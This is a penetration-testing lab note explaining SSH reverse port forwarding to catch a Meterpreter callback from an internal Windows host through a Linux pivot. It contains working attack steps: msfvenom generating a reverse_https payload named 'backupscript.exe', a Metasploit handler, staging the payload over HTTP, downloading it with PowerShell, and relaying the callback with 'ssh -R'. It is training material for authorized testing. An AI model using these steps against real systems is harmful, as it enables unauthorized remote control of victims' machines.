## Overview

This note covers **remote/reverse port forwarding with SSH**.

So far, there are three related SSH pivoting ideas:

- **Local port forwarding** → bring a remote service to your local machine
- **Dynamic port forwarding** → create a SOCKS proxy to reach deeper networks
- **Remote/reverse port forwarding** → expose a service on the pivot host that forwards back to your attack host

A simple way to think about it:

- **Local forwarding** = “I want to reach something on the pivot from my box”
- **Dynamic forwarding** = “I want my tools to route through the pivot into another network”
- **Reverse forwarding** = “I want the target to connect to the pivot, and the pivot to send that traffic back to me”

This is especially useful for **reverse shells** when the target cannot directly reach your attack host.

---

# Why Reverse Port Forwarding Is Needed

## The Problem

Assume:

- your attack host can reach the Ubuntu pivot host
- the Ubuntu pivot host can reach an internal Windows target
- the Windows target **cannot directly route traffic back to your attack host**

Example:

- Attack host → `10.10.15.x`
- Pivot host external-facing IP → `10.129.x.x`
- Pivot host internal-facing IP → `172.16.5.129`
- Windows target → `172.16.5.19`

You may be able to:

- RDP into the Windows system through a pivot
- browse internal services
- enumerate the host

But if you try to get a **reverse shell** directly back to your attack machine, it fails because the Windows host does not know how to route to your attack network.

---

## Why RDP Alone Is Not Always Enough

RDP is useful, but it has limits.

You may still want:

- file upload/download when clipboard is disabled
- a Meterpreter session
- low-level API interaction
- in-memory tooling
- post-exploitation modules
- more stable command execution
- payload staging

In those situations, you need the target to connect somewhere it **can** reach.

That “somewhere” is often the **pivot host**.

---

# Reverse Port Forwarding Concept

## Core Idea

Instead of telling the payload to connect directly to your attack host, you tell it to connect to the **pivot host**.

Then you use **SSH remote port forwarding** so that:

- the pivot host listens on a chosen port
- any connection arriving there is forwarded over SSH
- the traffic is delivered to your listener running on your attack host

So the traffic path becomes:

1. Windows target connects to pivot host
2. Pivot host receives connection on forwarded port
3. SSH carries that traffic back to your attack host
4. your listener receives the session

---

# Scenario

## Assumed Access

You already have:

- SSH access to the Ubuntu pivot host
- some way to execute code on the Windows target
- a listener ready on your attack machine

The pivot host is the bridge between both sides.

---

# Step 1: Create a Payload for the Pivot Path

Because the Windows target can reach the internal IP of the Ubuntu pivot host, configure the payload to call back to that address.

Example payload generation:

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<InternalIPofPivotHost> LPORT=8080 -f exe -o backupscript.exe
```

## Example

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 LPORT=8080 -f exe -o backupscript.exe
```

## Why This Works

The payload believes its handler is at:

- `172.16.5.129:8080`

From the Windows target’s perspective, that is reachable.

But in reality:

- Ubuntu will listen on `172.16.5.129:8080`
- SSH will forward that traffic back to your real listener on the attack host

---

# Step 2: Start the Metasploit Listener

Now configure Metasploit on your attack host.

```text
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set lhost 0.0.0.0
set lport 8000
run
```

## Example Session

```text
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp

msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
payload => windows/x64/meterpreter/reverse_https

msf6 exploit(multi/handler) > set lhost 0.0.0.0
lhost => 0.0.0.0

msf6 exploit(multi/handler) > set lport 8000
lport => 8000

msf6 exploit(multi/handler) > run

[*] Started HTTPS reverse handler on https://0.0.0.0:8000
```

## Why Port 8000 Here?

Because we are going to make SSH forward:

- pivot host `172.16.5.129:8080`
- to attack host `0.0.0.0:8000`

So the payload calls the pivot on `8080`, and SSH relays it back to your real handler on `8000`.

---

# Step 3: Transfer the Payload to the Pivot Host

Use `scp` to move the payload to the Ubuntu server.

```bash
scp backupscript.exe ubuntu@<ipAddressofTarget>:~/
```

## Example

```bash
scp backupscript.exe ubuntu@10.129.202.64:~/
```

---

# Step 4: Host the Payload on the Pivot Host

Start a simple HTTP server from the directory containing the payload.

```bash
python3 -m http.server 8123
```

## Why This Step Matters

The Windows target may not have a convenient way to receive the payload directly from your attack host, but it can often download it from the pivot host because they are on the same internal network.

---

# Step 5: Download the Payload on the Windows Target

Use PowerShell to download the executable from the Ubuntu pivot host.

```powershell
Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
```

## What This Does

This downloads the payload from:

- `172.16.5.129:8123`

and saves it as:

- `C:\backupscript.exe`

---

# Step 6: Create the SSH Reverse Port Forward

Now create the actual remote port forward from your attack host.

```bash
ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
```

## Example

```bash
ssh -R 172.16.5.129:8080:0.0.0.0:8000 ubuntu@10.129.202.64 -vN
```

---

## Breaking Down `-R`

The format is:

```bash
ssh -R <listen_address_on_pivot>:<listen_port_on_pivot>:<destination_on_attack_host>:<destination_port_on_attack_host> <user>@<pivot>
```

In this example:

- SSH tells the Ubuntu server to listen on `172.16.5.129:8080`
- any connection to that socket is sent through the SSH tunnel
- SSH forwards the traffic back to your attack host at `0.0.0.0:8000`

---

## What `-vN` Means

- `-v` = verbose output
- `-N` = do not open an interactive shell

This is useful because you only care about the tunnel, not a login shell.

---

# Traffic Flow Explanation

Once this tunnel is in place, here is what happens:

1. `backupscript.exe` runs on Windows
2. it tries to connect to `172.16.5.129:8080`
3. Ubuntu receives that connection
4. SSH has been told to reverse-forward that port
5. SSH carries the connection back to your attack machine
6. Metasploit receives it on port `8000`

So although the payload thinks it is talking to the pivot host, it is actually reaching your real listener.

---

```text
debug1: channel 1: connected to 0.0.0.0 port 8000
```

## What This Tells You

- a host at `172.16.5.19` connected to the pivot
- the pivot accepted that connection on port `8080`
- SSH forwarded it to `0.0.0.0:8000`
- your attack host listener should now receive the traffic

After the reverse port forward is active, execute the payload on Windows.

For example:

```powershell

```

If everything is set up properly, the Meterpreter session should return to your handler.

# Why the Session Appears as 127.0.0.1

This often confuses people the first time.

Metasploit may show the incoming session as coming from:

- `127.0.0.1`

That is because your handler is receiving the traffic through the **local end of the SSH tunnel**, not directly from the Windows target.

So from the handler’s perspective:

- the traffic arrives via the SSH client socket on your own machine

That is expected.

---

# Why This Technique Is Powerful

Reverse SSH port forwarding is useful when:

- the target cannot directly reach your attack host
- egress filtering prevents outbound access to your box
- the pivot host can reach both sides
- you need a reverse shell through a routed middle point

It effectively lets you “borrow” the pivot host’s reachability.

---

# When to Use This

This technique is ideal when:

- you already have SSH access to a pivot host
- the target host can talk to the pivot host
- the target host cannot directly route back to you
- you want a reverse shell, Meterpreter, or callback-based tooling

It is especially useful in segmented environments where:

- you can access a jump box or Linux pivot
- but internal Windows targets have no outbound path to your attack machine

---

# Practical Mental Model

Think of this like setting up a receptionist on the pivot host.

- The Windows target walks up to the receptionist at `172.16.5.129:8080`
- The receptionist takes the call
- SSH secretly relays the call through a private line
- Your handler answers it back on your attack host

The Windows target never needs to know your real location.

# Local vs Remote SSH Port Forwarding

## Local Port Forwarding (`-L`)

Use when **you** want to connect to something through the pivot.

Example:

```bash
ssh -L 1234:localhost:3306 ubuntu@10.129.202.64
```

Meaning:

- your box listens on `1234`
- traffic goes to remote `localhost:3306`

---

## Remote Port Forwarding (`-R`)

Use when the **target** needs to connect to something on **your** side through the pivot.

Example:

```bash
ssh -R 172.16.5.129:8080:0.0.0.0:8000 ubuntu@10.129.202.64 -vN
```

Meaning:

- pivot listens on `172.16.5.129:8080`
- traffic goes back to your listener on `8000`

---

# Common Troubleshooting Notes

## 1. Handler Running?

Make sure Metasploit is listening before executing the payload.

## 2. Correct LHOST in Payload?

The payload must point to the **pivot host’s internal IP**, not your attack host.

## 3. Correct Tunnel Direction?

If you use `-L` instead of `-R`, the callback will not work as intended.

## 4. Port Reachability

Confirm the Windows target can reach the pivot host on the port you selected.

## 5. Firewall Restrictions

The pivot host may block listening on certain interfaces or ports.

## 6. Binding Issues

Some SSH servers may restrict remote port binds depending on configuration.

## 7. Payload Delivery

Make sure the Windows host actually downloaded the payload correctly.

---

# Key Takeaways

- **Reverse SSH port forwarding** is used when the target cannot call back to your attack host directly.
- The payload should point to the **pivot host**, not you.
- SSH then forwards the pivot’s listening port back to your real listener.
- This is very useful for **Meterpreter**, reverse shells, and callback-style payloads.
- It turns the pivot host into a **bridge for inbound callbacks** from otherwise isolated internal targets.
